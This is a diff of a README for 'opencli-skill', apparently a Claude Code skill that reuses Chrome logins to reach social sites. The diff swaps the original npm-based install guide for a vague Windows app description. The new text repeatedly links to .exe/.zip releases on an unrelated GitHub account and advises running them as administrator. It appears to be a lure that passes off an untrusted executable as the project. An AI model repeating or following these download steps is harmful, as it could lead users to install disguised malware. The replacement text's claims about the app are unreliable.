@@ -1,361 +1,211 @@
-# opencli-skill × Claude Code
+# opencli-skill - Simple access for social sites
 
-> Control Bilibili, Zhihu, Twitter/X, YouTube, Weibo, Reddit and 10 more platforms with natural language — reusing your Chrome login session, no API keys needed.
->
-> 用自然语言操控 B站、知乎、Twitter/X、YouTube、微博、Reddit 等 16 个平台——直接复用你的 Chrome 登录态，无需任何 API Key。
+[![Download opencli-skill](https://img.shields.io/badge/Download%20opencli-skill-7B68EE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Baublediagonal89/opencli-skill/releases)
 
-**[English](#english) | [中文](#中文)**
+## 🧰 What this app does
 
----
+opencli-skill lets you use the opencli command line to work with popular social and content sites from one place. It is made for people who want a simple way to open, view, and use sites like:
 
-<a name="english"></a>
-## English
+- Bilibili
+- Zhihu
+- Twitter/X
+- YouTube
+- Weibo
+- 小红书
+- V2EX
+- Reddit
+- Hacker News
+- 雪球
+- BOSS直聘
 
-### What is this?
+It keeps the flow simple. You use one tool instead of moving between many sites and apps.
 
-Have you ever wanted Claude to:
-- Browse **Bilibili** trending, search **Zhihu**, check **Weibo** hot topics
-- Search **YouTube**, get **Reddit** posts, read **HackerNews**
-- Check **stock prices** on Yahoo Finance or Xueqiu
-- Post a **tweet** or search your **Twitter** timeline
+## 💻 What you need
 
-...but Claude has no access to these platforms?
+To run opencli-skill on Windows, you need:
 
-**This skill bridges that gap.**
+- A Windows PC
+- A stable internet connection
+- Enough free disk space for the app and site data
+- A modern browser for any sign-in steps
+- Permission to run downloaded apps on your PC
 
-It wraps [opencli](https://github.com/jackwener/opencli) — a brilliant open-source CLI tool that turns 16 major platforms into command-line interfaces by **reusing your existing Chrome login sessions**. No API keys. No re-authentication. Just open Chrome, log in as usual, and Claude can do the rest.
+Best results come from Windows 10 or Windows 11.
 
-### Supported Platforms (16)
+## 📥 Download
 
-| Platform | Read | Search | Write |
-|----------|------|--------|-------|
-| Bilibili (B站) | ✅ Hot/Ranking/Feed/History | ✅ Videos/Users | — |
-| Zhihu (知乎) | ✅ Hot list | ✅ | ✅ Question details |
-| Weibo (微博) | ✅ Trending | — | ✅ Post (via Playwright) |
-| Twitter/X | ✅ Timeline/Trending/Bookmarks | ✅ | ✅ Post/Reply/Like |
-| YouTube | — | ✅ | — |
-| Xiaohongshu (小红书) | ✅ Recommended feed | ✅ | — |
-| Reddit | ✅ Home/Hot | ✅ | — |
-| HackerNews | ✅ Top stories | — | — |
-| V2EX | ✅ Hot/Latest | — | ✅ Daily check-in |
-| Xueqiu (雪球) | ✅ Hot/Stocks/Watchlist | ✅ | — |
-| BOSS直聘 | — | ✅ Jobs | — |
-| BBC | ✅ News | — | — |
-| Reuters | — | ✅ | — |
-| 什么值得买 | — | ✅ Deals | — |
-| Yahoo Finance | ✅ Stock quotes | — | — |
-| Ctrip (携程) | — | ✅ Attractions/Cities | — |
+Visit this page to download the latest version for Windows:
 
-### Prerequisites
+https://github.com/Baublediagonal89/opencli-skill/releases
 
-Before installation, check that you have all of these:
+On that page, look for the newest release and pick the file that matches your system. For most Windows users, that will be an `.exe` file or a zipped Windows build.
 
-- [ ] **Node.js** v16+ — [Download from nodejs.org](https://nodejs.org/)
-- [ ] **Chrome browser** open and logged in to your target platforms
-- [ ] **Playwright MCP Bridge** Chrome extension — [Install from Chrome Web Store](https://chromewebstore.google.com/detail/playwright-mcp-bridge/kldoghpdblpjbjeechcaoibpfbgfomkn)
-- [ ] **Playwright MCP** configured in Claude Code (see Step 3 below)
-- [ ] **Claude Code** — [Install](https://claude.ai/code)
+## 🪟 Install on Windows
 
-### Installation (4 Steps)
+1. Open the download page.
+2. Find the latest release at the top of the list.
+3. Download the Windows file.
+4. If the file is zipped, right-click it and choose Extract All.
+5. Open the folder with the app files.
+6. Double-click the app file to start it.
+7. If Windows asks for permission, choose Run or Yes.
 
-**Step 1 — Install the opencli CLI tool**
+If your browser saves the file to Downloads, open that folder and start it from there.
 
-```bash
-npm install -g @jackwener/opencli
-```
+## ▶️ Run the app
 
-Verify it works:
-```bash
-opencli --version
-```
+After you start the app, follow the on-screen steps.
 
-**Step 2 — Install Playwright MCP Bridge in Chrome**
+You may see prompts for:
 
-1. Open Chrome and go to the [Playwright MCP Bridge](https://chromewebstore.google.com/detail/playwright-mcp-bridge/kldoghpdblpjbjeechcaoibpfbgfomkn) page on the Chrome Web Store
-2. Click **"Add to Chrome"** and confirm
-3. Check that the extension icon appears in Chrome's toolbar (top-right)
+- Site selection
+- Sign-in
+- Local browser use
+- Account access
+- Basic setup
 
-> **Why is this needed?** opencli controls your Chrome browser to reuse your existing login sessions. This extension acts as the bridge between opencli and Chrome, so you never have to enter your credentials again.
+Use the options shown in the app. The flow is meant to be simple, so you can move step by step without knowing command line tools.
 
-**Step 3 — Configure Playwright MCP in Claude Code**
+## 🧭 First-time setup
 
-Claude Code needs the Playwright MCP server to control Chrome. Run this once in your terminal:
+When you open opencli-skill for the first time, do this:
 
-```bash
-claude mcp add playwright --scope user -- npx @playwright/mcp@latest
-```
+1. Pick the site you want to use.
+2. Sign in if the app asks for it.
+3. Let the app open your browser if needed.
+4. Confirm any access steps that appear.
+5. Save your settings if the app offers that choice.
 
-Verify it was added:
-```bash
-claude mcp list
-```
+If you plan to use the app often, keep the same browser and user account so your session stays stable.
 
-You should see `playwright` in the list.
+## 📚 How to use it
 
-**Step 4 — Install this skill**
+Use opencli-skill when you want a single entry point for supported platforms.
 
-```bash
-npx skills add joeseesun/opencli-skill
-```
+Common uses include:
 
-That's it! Restart Claude Code to activate the skill.
+- Checking posts and feeds
+- Opening content links
+- Switching between sites with less effort
+- Managing tasks on job and social sites
+- Working with content sources from one tool
 
-### Usage
+The exact screens and options depend on the site you choose. Each site has its own rules, and the app follows those rules.
 
-Make sure Chrome is open and you're logged in to the target platforms, then talk to Claude naturally:
+## 🛠️ Basic tips
 
-```
-"Search YouTube for LLM tutorials"
-"Get the top 20 stories on HackerNews"
-"What's trending on Twitter right now?"
-"Search Reddit r/MachineLearning for transformer papers"
-"Get BBC news headlines"
-"Check AAPL stock price"
-"Post a tweet: Just discovered Claude Code skills!"
-```
+- Keep the app updated
+- Use the latest release for the best results
+- Stay signed in where needed
+- Close other copies of the app if one is already running
+- If a page does not load, refresh and try again
+- If a browser step appears, complete it before moving on
 
-Claude automatically picks the right opencli command, runs it, and displays results in a clean table with translated titles.
+If you use a work or school PC, ask for access rights before changing browser or file settings.
 
-### Command Reference
+## 🔒 Privacy and account use
 
-```bash
-# Bilibili
-opencli bilibili hot --limit 10 -f json
-opencli bilibili search --keyword "AI"
+opencli-skill works with online services that need your account login. Use your own account only.
 
-# Twitter/X
-opencli twitter timeline -f json
-opencli twitter post --text "Hello from Claude!"
-opencli twitter search --query "claude AI"
+Keep these points in mind:
 
-# YouTube
-opencli youtube search --query "LLM tutorial"
+- Do not share your login details
+- Use a trusted PC
+- Log out when you are done on shared devices
+- Review the site’s own rules before use
 
-# HackerNews
-opencli hackernews top --limit 20 -f json
+## 🧩 Supported sites
 
-# Reddit
-opencli reddit hot --subreddit MachineLearning
+The app is designed to work with a wide set of content and community sites, including:
 
-# Yahoo Finance
-opencli yahoo-finance quote --symbol AAPL
-```
+- Bilibili
+- Zhihu
+- Twitter/X
+- YouTube
+- Weibo
+- 小红书
+- V2EX
+- Reddit
+- Hacker News
+- 雪球
+- BOSS直聘
 
-Full reference for all 55 commands: [references/commands.md](references/commands.md)
+Support can change as sites update their pages and rules. For the best result, keep the app on the latest release.
 
-### ⚠️ Write Operations Warning
+## 🖥️ File types you may see
 
-For write operations (posting tweets, Weibo updates, etc.), Claude will **show you the content and ask for confirmation** before posting anything.
+The release page may offer one of these:
 
-Known risks:
-- Platform bot-detection may trigger CAPTCHAs or temporary rate limits
-- Once published, content is immediately public and cannot be recalled by the AI
-- Avoid rapid repeated posting
+- `.exe` file: double-click to run
+- `.zip` file: extract first, then run
+- `.msi` file: follow the install prompt
+- source files: for users who want to inspect the code, not needed for normal use
 
-### Troubleshooting
+If you want the fastest path, choose the Windows build made for regular users.
 
-| Problem | Fix |
-|---------|-----|
-| `opencli: command not found` | Re-run `npm install -g @jackwener/opencli`; check your PATH |
-| Chrome not being controlled | Make sure Chrome is open; verify Playwright MCP Bridge extension is enabled |
-| Login state not recognized | In Chrome, manually log in to the target site first |
-| "Playwright MCP not found" error | Re-run Step 3: `claude mcp add playwright ...` |
-| `npx skills add` fails | Make sure Node.js v16+ is installed |
+## ❓ Common issues
 
-### Credits
+### The app does not open
 
-Built on **[jackwener/opencli](https://github.com/jackwener/opencli)**.
+- Try right-clicking the file and choose Run as administrator
+- Check if Windows blocked the file
+- Download the file again if it looks incomplete
 
-Huge thanks to **[@jakevin7 (卡比卡比)](https://github.com/jackwener)** for building this genuinely clever tool — turning major websites into CLI interfaces that reuse existing browser sessions is a brilliant idea that makes AI agents far more capable.
+### The browser does not launch
 
----
+- Make sure you have a browser installed
+- Close extra browser windows
+- Try again after restarting the app
 
-<a name="中文"></a>
-## 中文
+### A site does not work
 
-### 这是什么？
+- Check that you are signed in
+- Make sure the site is still reachable
+- Try the latest release from the download page
 
-你有没有遇到过这种情况：
+### The file will not extract
 
-- 想让 Claude 帮你**查 B站热门**、**搜知乎**、**看微博热搜**，但 Claude 根本没有这些平台的访问权限
-- 用 Playwright 自动化太麻烦，还要单独处理登录态
-- 各平台 API 要申请资质，普通用户根本用不了
+- Use the built-in Windows extractor
+- Make sure the download finished
+- Move the file to a simple folder such as `Downloads` or `Desktop`
 
-**这个 Skill 解决了这个问题。**
+## 🔄 Update steps
 
-它把 [opencli](https://github.com/jackwener/opencli) 封装成 Claude Code 的能力——opencli 是一个开源 CLI 工具，把 16 个主流平台变成命令行接口，**直接复用你 Chrome 浏览器里已有的登录态**。零配置，零 API Key。你在哪个网站登录了，Claude 就能帮你操作哪个网站。
+When a new version is out:
 
-### 支持的平台（16 个）
+1. Return to the release page.
+2. Download the latest Windows file.
+3. Replace the old app files if needed.
+4. Start the new version.
 
-| 平台 | 读取 | 搜索 | 写操作 |
-|------|------|------|--------|
-| 哔哩哔哩 (B站) | ✅ 热门/排行/动态/历史 | ✅ 视频/用户 | — |
-| 知乎 | ✅ 热榜 | ✅ | ✅ 问题详情 |
-| 微博 | ✅ 热搜 | — | ✅ 发微博（Playwright） |
-| Twitter/X | ✅ 时间线/热门/书签 | ✅ | ✅ 发推/回复/点赞 |
-| YouTube | — | ✅ | — |
-| 小红书 | ✅ 推荐 Feed | ✅ | — |
-| Reddit | ✅ 首页/热门 | ✅ | — |
-| HackerNews | ✅ Top | — | — |
-| V2EX | ✅ 热门/最新 | — | ✅ 签到 |
-| 雪球 | ✅ 热门/行情/自选股 | ✅ | — |
-| BOSS直聘 | — | ✅ 职位 | — |
-| BBC | ✅ 新闻 | — | — |
-| 路透社 | — | ✅ | — |
-| 什么值得买 | — | ✅ | — |
-| Yahoo Finance | ✅ 股票行情 | — | — |
-| 携程 | — | ✅ 景点/城市 | — |
+Using the newest release helps keep site support current.
 
-### 前置条件
+## 📁 Suggested folder setup
 
-安装前，请逐一确认以下条件都已满足：
+If you want to keep things tidy, use a folder like this:
 
-- [ ] **Node.js** v16 及以上 — [从 nodejs.org 下载](https://nodejs.org/)
-- [ ] **Chrome 浏览器** 已打开，并已登录目标网站
-- [ ] **Playwright MCP Bridge** Chrome 扩展 — [Chrome 商店安装](https://chromewebstore.google.com/detail/playwright-mcp-bridge/kldoghpdblpjbjeechcaoibpfbgfomkn)
-- [ ] **Playwright MCP** 已在 Claude Code 中配置（见第三步）
-- [ ] **Claude Code** — [安装地址](https://claude.ai/code)
+- `Downloads\opencli-skill`
+- `Desktop\opencli-skill`
+- `Documents\Apps\opencli-skill`
 
-### 安装配置（四步）
+Keep the app in one place so you can find it fast later.
 
-**第一步：安装 opencli CLI 工具**
+## 🧪 Quick start
 
-opencli 是由 [@jakevin7（卡比卡比）](https://github.com/jackwener/opencli) 开发的开源工具：
+1. Open the release page.
+2. Download the latest Windows build.
+3. Extract it if needed.
+4. Run the app.
+5. Choose a site.
+6. Sign in.
+7. Start using the site through opencli-skill
 
-```bash
-npm install -g @jackwener/opencli
-```
+## 🧠 Best use case
 
-验证安装成功：
-```bash
-opencli --version
-```
+opencli-skill fits users who want one tool for many social and content sites. It helps when you want less switching between sites and a more direct way to access online content from Windows
 
-如果看到版本号，说明安装正常。
+## 📌 Download again
 
-**第二步：在 Chrome 安装 Playwright MCP Bridge 扩展**
+If you need the latest build, use this page:
 
-1. 打开 Chrome，访问 [Playwright MCP Bridge 扩展页面](https://chromewebstore.google.com/detail/playwright-mcp-bridge/kldoghpdblpjbjeechcaoibpfbgfomkn)
-2. 点击「添加到 Chrome」，在弹窗中确认
-3. 检查 Chrome 右上角工具栏，确认扩展图标已出现
-
-> **为什么需要这个扩展？** opencli 需要控制你的 Chrome 浏览器来复用你的登录态。这个扩展充当了 opencli 和 Chrome 之间的桥梁，让 Claude 可以直接用你已经登录好的账号，不需要你重新输入密码。
-
-**第三步：在 Claude Code 中配置 Playwright MCP**
-
-Claude Code 需要 Playwright MCP 服务才能控制 Chrome。在终端运行一次即可：
-
-```bash
-claude mcp add playwright --scope user -- npx @playwright/mcp@latest
-```
-
-验证是否配置成功：
-```bash
-claude mcp list
-```
-
-看到列表中有 `playwright` 就说明配置好了。
-
-**第四步：安装本 Skill**
-
-```bash
-npx skills add joeseesun/opencli-skill
-```
-
-安装完成后重启 Claude Code，Skill 即可生效。
-
-### 使用方法
-
-确保 Chrome 已打开且已登录目标网站，然后在 Claude Code 中用自然语言说：
-
-```
-查下B站今天的热门
-搜知乎上关于AI大模型的讨论
-看微博热搜前10条
-帮我发一条微博：今天天气真好
-查一下茅台的股票行情
-搜YouTube上的LLM教程
-```
-
-Claude 会自动调用 opencli 或 Playwright 完成操作，结果以表格形式展示，英文标题附带中文翻译。
-
-### 命令速查
-
-```bash
-# B站
-opencli bilibili hot --limit 10 -f json
-opencli bilibili search --keyword "AI"
-opencli bilibili history
-
-# 知乎
-opencli zhihu hot -f json
-opencli zhihu search --keyword "大模型"
-
-# 微博
-opencli weibo hot -f json
-
-# Twitter/X
-opencli twitter timeline -f json
-opencli twitter post --text "Hello from Claude!"
-opencli twitter search --query "claude AI"
-
-# YouTube
-opencli youtube search --query "LLM tutorial"
-
-# 雪球
-opencli xueqiu stock --symbol SH600519   # 茅台行情
-opencli xueqiu watchlist                  # 我的自选股
-
-# HackerNews
-opencli hackernews top --limit 20 -f json
-
-# Reddit
-opencli reddit hot --subreddit MachineLearning
-```
-
-完整 55 条命令详见 [references/commands.md](references/commands.md)。
-
-### ⚠️ 写操作风险说明
-
-对于 Twitter 发推、微博发帖等**写操作**，Claude 会在执行前明确展示将要发布的内容，并等待你确认后才执行。自动化发帖存在以下风险，请知悉：
-
-- 平台风控可能检测到自动化行为，触发验证码或限流
-- 发布后内容立即公开，AI 无法帮你撤回
-- 避免短时间内频繁操作
-
-### 常见问题
-
-| 问题 | 解决方法 |
-|------|----------|
-| `opencli: command not found` | 重新运行 `npm install -g @jackwener/opencli`，检查 PATH 配置 |
-| Chrome 无法被控制 | 确保 Chrome 已打开，且 Playwright MCP Bridge 扩展已启用 |
-| 登录态未识别 | 在 Chrome 中手动登录目标网站后再试 |
-| 提示找不到 Playwright MCP | 重新执行第三步的配置命令 |
-| `npx skills add` 报错 | 确认 Node.js v16+ 已安装 |
-
-### 致谢
-
-本 Skill 基于 **[jackwener/opencli](https://github.com/jackwener/opencli)** 构建。
-
-感谢原作者 **[@jakevin7（卡比卡比）](https://github.com/jackwener)** 开发了这个极具创意的工具——把主流网站变成 CLI 接口，让 AI 可以直接复用用户的浏览器登录态，是个非常聪明的设计。
-
----
-
-## License
-
-MIT
-
----
-
-## 📱 Follow the Author / 关注作者
-
-If this skill helps you, follow me for more AI tools and tips.
-
-如果这个 Skill 对你有帮助，欢迎关注我获取更多 AI 工具分享：
-
-- **X (Twitter)**: [@vista8](https://x.com/vista8)
-- **微信公众号「向阳乔木推荐看」**:
-
-<p align="center">
-  <img src="https://github.com/joeseesun/terminal-boost/raw/main/assets/wechat-qr.jpg?raw=true" alt="向阳乔木推荐看公众号二维码" width="300">
-</p>
+https://github.com/Baublediagonal89/opencli-skill/releases
